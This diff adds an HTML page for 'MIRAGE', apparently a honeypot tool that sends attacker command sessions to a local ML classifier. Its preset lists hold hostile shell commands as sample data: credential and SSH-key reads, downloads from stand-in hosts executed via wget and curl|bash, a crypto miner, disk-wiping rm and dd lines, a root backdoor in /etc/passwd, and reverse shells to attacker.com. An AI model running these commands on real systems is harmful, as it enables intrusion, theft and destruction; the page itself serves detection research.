@@ -1,0 +1,410 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8"/>
+<meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+<title>MIRAGE — ML Classifier Tester</title>
+<link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;600;700&family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet"/>
+<style>
+*{box-sizing:border-box;margin:0;padding:0}
+:root{
+  --bg:#0d1117;--panel:#161b22;--panel2:#21262d;
+  --border:#30363d;--text:#e6edf3;--muted:#7d8590;
+  --green:#3fb950;--red:#f85149;--orange:#d29922;--blue:#58a6ff;--purple:#bc8cff;
+  --apt:#f85149;--bot:#58a6ff;--sk:#d29922;
+}
+body{background:var(--bg);color:var(--text);font-family:'Inter',sans-serif;min-height:100vh}
+
+/* NAV */
+nav{background:var(--panel);border-bottom:1px solid var(--border);padding:14px 28px;display:flex;align-items:center;justify-content:space-between}
+.nav-logo{font-family:'JetBrains Mono',monospace;font-weight:700;font-size:18px;color:var(--green);letter-spacing:2px}
+.nav-sub{font-size:12px;color:var(--muted);margin-top:2px}
+.nav-links a{color:var(--muted);text-decoration:none;font-size:13px;margin-left:20px;transition:color .2s}
+.nav-links a:hover{color:var(--text)}
+
+/* LAYOUT */
+.container{display:grid;grid-template-columns:1fr 400px;gap:16px;padding:20px 24px;max-width:1400px;margin:0 auto}
+@media(max-width:900px){.container{grid-template-columns:1fr}}
+
+/* PANEL */
+.panel{background:var(--panel);border:1px solid var(--border);border-radius:8px;overflow:hidden}
+.panel-hdr{padding:12px 16px;border-bottom:1px solid var(--border);background:var(--panel2);display:flex;align-items:center;justify-content:space-between}
+.panel-title{font-size:12px;font-weight:600;text-transform:uppercase;letter-spacing:.7px;color:var(--muted)}
+.panel-body{padding:16px}
+
+/* PRESET BUTTONS */
+.presets{display:flex;gap:8px;flex-wrap:wrap;margin-bottom:14px}
+.preset-btn{padding:6px 14px;border:1px solid var(--border);border-radius:6px;background:transparent;color:var(--text);font-size:12px;font-family:'JetBrains Mono',monospace;cursor:pointer;transition:all .2s}
+.preset-btn:hover{transform:translateY(-1px)}
+.preset-apt{border-color:var(--apt);color:var(--apt)}
+.preset-apt:hover{background:rgba(248,81,73,.1)}
+.preset-bot{border-color:var(--bot);color:var(--bot)}
+.preset-bot:hover{background:rgba(88,166,255,.1)}
+.preset-sk{border-color:var(--sk);color:var(--sk)}
+.preset-sk:hover{background:rgba(210,153,34,.1)}
+
+/* TERMINAL INPUT */
+.term-wrap{background:#010409;border:1px solid var(--border);border-radius:6px;padding:12px;margin-bottom:12px;min-height:160px;position:relative}
+.term-bar{display:flex;gap:6px;margin-bottom:10px;padding-bottom:8px;border-bottom:1px solid #21262d}
+.term-dot{width:10px;height:10px;border-radius:50%}
+.term-lines{font-family:'JetBrains Mono',monospace;font-size:12px;line-height:1.7;min-height:120px}
+.term-line{color:#e6edf3;padding:1px 0}
+.term-line .prompt{color:#3fb950;margin-right:8px;user-select:none}
+.term-line.rm{color:#f85149}
+.term-line.dl{color:#58a6ff}
+.term-line.recon{color:#bc8cff}
+
+/* TIMING SECTION */
+.timing-note{font-size:11px;color:var(--muted);margin-bottom:8px}
+.timing-row{display:flex;align-items:center;gap:10px;margin-bottom:8px}
+.timing-label{font-size:11px;color:var(--muted);width:90px;flex-shrink:0}
+input[type=range]{flex:1;accent-color:var(--green)}
+.timing-val{font-family:'JetBrains Mono',monospace;font-size:11px;color:var(--text);width:45px;text-align:right}
+
+textarea#cmd-input{width:100%;background:#010409;border:1px solid var(--border);border-radius:6px;color:var(--text);font-family:'JetBrains Mono',monospace;font-size:12px;padding:10px 12px;resize:vertical;min-height:100px;outline:none;line-height:1.7}
+textarea#cmd-input:focus{border-color:var(--green)}
+
+.run-btn{width:100%;padding:11px;background:var(--green);color:#000;font-weight:700;font-size:14px;border:none;border-radius:6px;cursor:pointer;font-family:'Inter',sans-serif;transition:all .2s;margin-top:10px}
+.run-btn:hover{background:#2ea043;transform:translateY(-1px)}
+.run-btn:disabled{background:var(--border);color:var(--muted);cursor:not-allowed;transform:none}
+
+/* RESULT CARD */
+.result-card{border-radius:8px;padding:20px;margin-bottom:14px;border:1px solid;display:none}
+.result-card.apt{background:rgba(248,81,73,.08);border-color:rgba(248,81,73,.4)}
+.result-card.bot{background:rgba(88,166,255,.08);border-color:rgba(88,166,255,.4)}
+.result-card.sk{background:rgba(210,153,34,.08);border-color:rgba(210,153,34,.4)}
+.result-card.unknown{background:rgba(125,133,144,.08);border-color:var(--border)}
+
+.result-type{font-size:28px;font-weight:700;font-family:'JetBrains Mono',monospace;margin-bottom:4px}
+.apt .result-type{color:var(--apt)}
+.bot .result-type{color:var(--bot)}
+.sk .result-type{color:var(--sk)}
+
+.result-conf{font-size:13px;color:var(--muted);margin-bottom:12px}
+.conf-bar-wrap{height:6px;background:var(--panel2);border-radius:3px;margin-bottom:14px;overflow:hidden}
+.conf-bar{height:100%;border-radius:3px;transition:width .8s ease}
+.apt .conf-bar{background:var(--apt)}
+.bot .conf-bar{background:var(--bot)}
+.sk .conf-bar{background:var(--sk)}
+
+.result-reasoning{font-size:13px;color:var(--text);line-height:1.6;padding:10px 12px;background:rgba(0,0,0,.2);border-radius:6px;margin-bottom:10px}
+.source-badge{display:inline-flex;align-items:center;gap:5px;font-size:10px;font-family:'JetBrains Mono',monospace;padding:2px 8px;border-radius:12px;background:var(--panel2);border:1px solid var(--border);color:var(--muted)}
+
+/* FEATURES */
+.feat-grid{display:grid;grid-template-columns:1fr 1fr;gap:6px}
+.feat-item{background:var(--panel2);border-radius:5px;padding:7px 10px}
+.feat-name{font-size:10px;color:var(--muted);font-family:'JetBrains Mono',monospace;margin-bottom:3px}
+.feat-val-wrap{display:flex;align-items:center;gap:6px}
+.feat-bar-wrap{flex:1;height:4px;background:var(--panel);border-radius:2px;overflow:hidden}
+.feat-bar{height:100%;border-radius:2px;background:var(--green);transition:width .6s ease}
+.feat-val{font-size:10px;font-family:'JetBrains Mono',monospace;color:var(--text);width:35px;text-align:right}
+.feat-flag{font-size:11px;font-family:'JetBrains Mono',monospace}
+.feat-flag.on{color:var(--red)}
+.feat-flag.off{color:var(--muted)}
+
+/* HISTORY */
+.history-item{display:flex;align-items:center;justify-content:space-between;padding:8px 0;border-bottom:1px solid var(--border);cursor:pointer;transition:background .15s}
+.history-item:hover{background:rgba(255,255,255,.02)}
+.hist-type{font-size:11px;font-weight:700;font-family:'JetBrains Mono',monospace;padding:2px 8px;border-radius:12px}
+.hist-apt{background:rgba(248,81,73,.15);color:var(--apt)}
+.hist-bot{background:rgba(88,166,255,.15);color:var(--bot)}
+.hist-sk{background:rgba(210,153,34,.15);color:var(--sk)}
+.hist-cmds{font-size:11px;color:var(--muted);font-family:'JetBrains Mono',monospace;overflow:hidden;text-overflow:ellipsis;white-space:nowrap;max-width:200px}
+.hist-conf{font-size:11px;color:var(--muted);font-family:'JetBrains Mono',monospace}
+
+.spinner{display:inline-block;width:14px;height:14px;border:2px solid var(--border);border-top-color:var(--green);border-radius:50%;animation:spin .6s linear infinite;vertical-align:middle;margin-right:6px}
+@keyframes spin{to{transform:rotate(360deg)}}
+
+.empty-hist{text-align:center;padding:24px;color:var(--muted);font-size:13px}
+</style>
+</head>
+<body>
+
+<nav>
+  <div>
+    <div class="nav-logo">MIRAGE</div>
+    <div class="nav-sub">ML Classifier Tester &nbsp;·&nbsp; RandomForest + GradientBoosting Ensemble</div>
+  </div>
+  <div class="nav-links">
+    <a href="http://localhost:3000" target="_blank">Live Dashboard</a>
+    <a href="http://localhost:8000/api/sessions" target="_blank">Sessions API</a>
+    <a href="http://localhost:8000/docs" target="_blank">API Docs</a>
+  </div>
+</nav>
+
+<div class="container">
+
+  <!-- LEFT: INPUT -->
+  <div>
+
+    <div class="panel" style="margin-bottom:16px">
+      <div class="panel-hdr">
+        <span class="panel-title">Quick Presets</span>
+        <span style="font-size:11px;color:var(--muted)">Click to load a realistic attack scenario</span>
+      </div>
+      <div class="panel-body">
+        <div class="presets">
+          <button class="preset-btn preset-apt" onclick="loadPreset('apt')">APT / Nation-State</button>
+          <button class="preset-btn preset-bot" onclick="loadPreset('bot')">Automated Bot</button>
+          <button class="preset-btn preset-sk"  onclick="loadPreset('sk')">Script Kiddie</button>
+          <button class="preset-btn preset-apt" onclick="loadPreset('apt2')">APT Lateral Move</button>
+          <button class="preset-btn preset-bot" onclick="loadPreset('bot2')">Crypto Miner Bot</button>
+          <button class="preset-btn preset-sk"  onclick="loadPreset('sk2')">Reverse Shell</button>
+        </div>
+
+        <!-- Terminal Preview -->
+        <div class="term-wrap" id="term-preview" style="display:none">
+          <div class="term-bar">
+            <div class="term-dot" style="background:#ff5f57"></div>
+            <div class="term-dot" style="background:#febc2e"></div>
+            <div class="term-dot" style="background:#28c840"></div>
+            <span style="font-family:'JetBrains Mono',monospace;font-size:11px;color:var(--muted);margin-left:8px">attacker@honeypot:~#</span>
+          </div>
+          <div class="term-lines" id="term-lines"></div>
+        </div>
+
+        <label style="font-size:12px;color:var(--muted);display:block;margin-bottom:6px">Enter commands (one per line):</label>
+        <textarea id="cmd-input" placeholder="whoami&#10;id&#10;uname -a&#10;cat /etc/passwd&#10;find / -name *.pem"></textarea>
+
+        <div class="timing-row" style="margin-top:12px">
+          <span class="timing-label">Avg delay (sec)</span>
+          <input type="range" id="timing-slider" min="0.05" max="30" step="0.05" value="5" oninput="document.getElementById('timing-disp').textContent=parseFloat(this.value).toFixed(2)+'s'">
+          <span class="timing-val" id="timing-disp">5.00s</span>
+        </div>
+
+        <button class="run-btn" id="run-btn" onclick="runClassify()">Classify Attacker</button>
+      </div>
+    </div>
+
+    <!-- Result Card -->
+    <div class="result-card" id="result-card">
+      <div class="result-type" id="res-type">-</div>
+      <div class="result-conf" id="res-conf">Confidence: -</div>
+      <div class="conf-bar-wrap"><div class="conf-bar" id="res-bar" style="width:0%"></div></div>
+      <div class="result-reasoning" id="res-reasoning">-</div>
+      <span class="source-badge" id="res-source">source: -</span>
+    </div>
+
+  </div>
+
+  <!-- RIGHT: FEATURES + HISTORY -->
+  <div>
+
+    <!-- Feature Breakdown -->
+    <div class="panel" style="margin-bottom:16px">
+      <div class="panel-hdr">
+        <span class="panel-title">Feature Breakdown</span>
+        <span style="font-size:11px;color:var(--muted)">22 ML features</span>
+      </div>
+      <div class="panel-body" id="feat-body">
+        <div class="empty-hist">Run a classification to see feature values</div>
+      </div>
+    </div>
+
+    <!-- History -->
+    <div class="panel">
+      <div class="panel-hdr">
+        <span class="panel-title">Classification History</span>
+        <span style="font-size:11px;color:var(--muted)" id="hist-count">0 tests</span>
+      </div>
+      <div class="panel-body" style="padding:0 16px" id="hist-body">
+        <div class="empty-hist">No classifications yet</div>
+      </div>
+    </div>
+
+  </div>
+</div>
+
+<script>
+const BACKEND = 'http://localhost:8000';
+let history = [];
+
+const PRESETS = {
+  apt: {
+    cmds: ["whoami","id","uname -a","hostname","ifconfig","ip addr","netstat -tulpn","cat /etc/passwd","find / -name '*.pem' 2>/dev/null","cat /home/admin/.ssh/authorized_keys","grep -r 'password' /etc 2>/dev/null","env","sudo -l"],
+    delay: 9.5, label:"APT — Slow Recon"
+  },
+  apt2: {
+    cmds: ["ss -tulpn","arp -a","cat /etc/hosts","nmap -sV 192.168.1.0/24","ssh root@192.168.1.10","cat /root/.ssh/id_rsa","cat /opt/app/.env","ps aux","last"],
+    delay: 12.0, label:"APT — Lateral Movement"
+  },
+  bot: {
+    cmds: ["wget http://malware.site/bot.sh","chmod +x /tmp/bot.sh","/tmp/bot.sh","echo '*/5 * * * * /tmp/bot.sh' | crontab -","wget http://c2.evil.net/payload -O /tmp/p","chmod 777 /tmp/p","/tmp/p"],
+    delay: 0.08, label:"Bot — Downloader"
+  },
+  bot2: {
+    cmds: ["wget http://evil.ru/xmrig -O /tmp/xmr","chmod +x /tmp/xmr","/tmp/xmr -o pool.minexmr.com:443 -u wallet &","nohup /tmp/xmr &","echo '@reboot /tmp/xmr' | crontab -","rm /tmp/xmr"],
+    delay: 0.12, label:"Bot — Crypto Miner"
+  },
+  sk: {
+    cmds: ["rm -rf /","rm -rf /*","dd if=/dev/zero of=/dev/sda","chmod 777 /etc/passwd","echo 'hacker::0:0::/root:/bin/bash' >> /etc/passwd","iptables -F","service iptables stop"],
+    delay: 0.6, label:"Script Kiddie — Destructive"
+  },
+  sk2: {
+    cmds: ["bash -i >& /dev/tcp/attacker.com/4444 0>&1","nc -e /bin/bash attacker.com 4444","python3 -c 'import socket,subprocess,os;s=socket.socket()'","curl https://pastebin.com/raw/xxxx | bash","wget -O - http://hack.com/s.sh | sh"],
+    delay: 1.2, label:"Script Kiddie — Reverse Shell"
+  }
+};
+
+function loadPreset(key) {
+  const p = PRESETS[key];
+  if (!p) return;
+  document.getElementById('cmd-input').value = p.cmds.join('\n');
+  document.getElementById('timing-slider').value = p.delay;
+  document.getElementById('timing-disp').textContent = p.delay.toFixed(2) + 's';
+  renderTermPreview(p.cmds);
+}
+
+function renderTermPreview(cmds) {
+  const container = document.getElementById('term-lines');
+  const preview = document.getElementById('term-preview');
+  preview.style.display = 'block';
+
+  const colorMap = {rm:'rm',wget:'dl',curl:'dl',whoami:'recon',id:'recon',
+    netstat:'recon',find:'recon',cat:'recon',grep:'recon',bash:'rm',nc:'rm',python3:'rm'};
+
+  container.innerHTML = cmds.map(cmd => {
+    const first = cmd.split(' ')[0];
+    const cls = colorMap[first] || '';
+    return `<div class="term-line ${cls}"><span class="prompt">$</span>${escHtml(cmd)}</div>`;
+  }).join('');
+}
+
+function escHtml(s){
+  return s.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');
+}
+
+async function runClassify() {
+  const raw = document.getElementById('cmd-input').value.trim();
+  if (!raw) return alert('Enter at least one command.');
+
+  const cmds = raw.split('\n').map(l => l.trim()).filter(Boolean);
+  const delay = parseFloat(document.getElementById('timing-slider').value);
+  const timings = cmds.map(() => delay + (Math.random() - 0.5) * delay * 0.3);
+
+  const btn = document.getElementById('run-btn');
+  btn.disabled = true;
+  btn.innerHTML = '<span class="spinner"></span>Classifying...';
+
+  try {
+    const resp = await fetch(`${BACKEND}/api/classify`, {
+      method: 'POST',
+      headers: {'Content-Type': 'application/json'},
+      body: JSON.stringify({commands: cmds, timings, src_ip: 'test-ui'})
+    });
+    const data = await resp.json();
+    if (data.error) throw new Error(data.error);
+    displayResult(data, cmds);
+    addHistory(data, cmds);
+  } catch(e) {
+    alert('Error: ' + e.message);
+  } finally {
+    btn.disabled = false;
+    btn.textContent = 'Classify Attacker';
+  }
+}
+
+function displayResult(data, cmds) {
+  const cl = data.classification;
+  const card = document.getElementById('result-card');
+  const typeMap = {'APT':'apt','Bot':'bot','Script Kiddie':'sk'};
+  const cls = typeMap[cl.type] || 'unknown';
+
+  card.className = 'result-card ' + cls;
+  card.style.display = 'block';
+
+  document.getElementById('res-type').textContent = cl.type;
+  const pct = Math.round((cl.confidence || 0) * 100);
+  document.getElementById('res-conf').textContent = `Confidence: ${pct}%  |  ${cmds.length} commands analyzed`;
+  document.getElementById('res-bar').style.width = pct + '%';
+  document.getElementById('res-reasoning').textContent = cl.reasoning || '—';
+  document.getElementById('res-source').textContent = 'source: ' + (cl.source || 'unknown');
+
+  card.scrollIntoView({behavior:'smooth', block:'nearest'});
+
+  // Feature breakdown
+  if (data.features) renderFeatures(data.features);
+}
+
+function renderFeatures(feat) {
+  const container = document.getElementById('feat-body');
+  const barFeat = ['recon%','download%','exec%','lateral%','destruct%','auth%'];
+  const numFeat = ['total_cmds','unique_cmds','entropy','burst_ratio'];
+  const flagFeat = ['has_sudo','has_privesc','has_pyexec','has_encoded','has_redirect'];
+
+  let html = '<div style="margin-bottom:10px"><div style="font-size:10px;color:var(--muted);margin-bottom:6px;text-transform:uppercase;letter-spacing:.5px">Command Categories</div><div class="feat-grid">';
+
+  barFeat.forEach(k => {
+    const v = feat[k] || 0;
+    const pct = Math.min(100, Math.round(v * 100));
+    html += `<div class="feat-item">
+      <div class="feat-name">${k}</div>
+      <div class="feat-val-wrap">
+        <div class="feat-bar-wrap"><div class="feat-bar" style="width:${pct}%"></div></div>
+        <span class="feat-val">${pct}%</span>
+      </div></div>`;
+  });
+  html += '</div></div>';
+
+  html += '<div style="margin-bottom:10px"><div style="font-size:10px;color:var(--muted);margin-bottom:6px;text-transform:uppercase;letter-spacing:.5px">Session Metrics</div><div class="feat-grid">';
+  numFeat.forEach(k => {
+    const v = feat[k] || 0;
+    const max = k === 'total_cmds' ? 50 : k === 'unique_cmds' ? 50 : k === 'entropy' ? 6 : 1;
+    const pct = Math.min(100, Math.round((v / max) * 100));
+    html += `<div class="feat-item">
+      <div class="feat-name">${k}</div>
+      <div class="feat-val-wrap">
+        <div class="feat-bar-wrap"><div class="feat-bar" style="width:${pct}%"></div></div>
+        <span class="feat-val">${typeof v === 'number' ? v.toFixed(2) : v}</span>
+      </div></div>`;
+  });
+  html += '</div></div>';
+
+  html += '<div><div style="font-size:10px;color:var(--muted);margin-bottom:6px;text-transform:uppercase;letter-spacing:.5px">Risk Signals</div><div class="feat-grid">';
+  flagFeat.forEach(k => {
+    const on = feat[k] === 1;
+    html += `<div class="feat-item" style="display:flex;align-items:center;justify-content:space-between">
+      <span class="feat-name" style="margin:0">${k.replace('has_','')}</span>
+      <span class="feat-flag ${on ? 'on' : 'off'}">${on ? 'DETECTED' : 'clear'}</span>
+    </div>`;
+  });
+  html += '</div></div>';
+
+  container.innerHTML = html;
+}
+
+function addHistory(data, cmds) {
+  const cl = data.classification;
+  const typeMap = {'APT':'apt','Bot':'bot','Script Kiddie':'sk'};
+  const cls = typeMap[cl.type] || '';
+  const pct = Math.round((cl.confidence || 0) * 100);
+
+  history.unshift({type: cl.type, cls, cmds, pct});
+  if (history.length > 20) history.pop();
+
+  const container = document.getElementById('hist-body');
+  document.getElementById('hist-count').textContent = history.length + ' tests';
+
+  container.innerHTML = history.map((h, i) => `
+    <div class="history-item" onclick="reloadHistory(${i})">
+      <span class="hist-type hist-${h.cls}">${h.type}</span>
+      <span class="hist-cmds">${h.cmds.slice(0,3).join(', ')}</span>
+      <span class="hist-conf">${h.pct}%</span>
+    </div>
+  `).join('');
+}
+
+function reloadHistory(i) {
+  const h = history[i];
+  document.getElementById('cmd-input').value = h.cmds.join('\n');
+  renderTermPreview(h.cmds);
+}
+
+// Sync textarea with terminal preview
+document.getElementById('cmd-input').addEventListener('input', function() {
+  const cmds = this.value.split('\n').filter(l => l.trim());
+  if (cmds.length > 0) renderTermPreview(cmds);
+});
+</script>
+</body>
+</html>
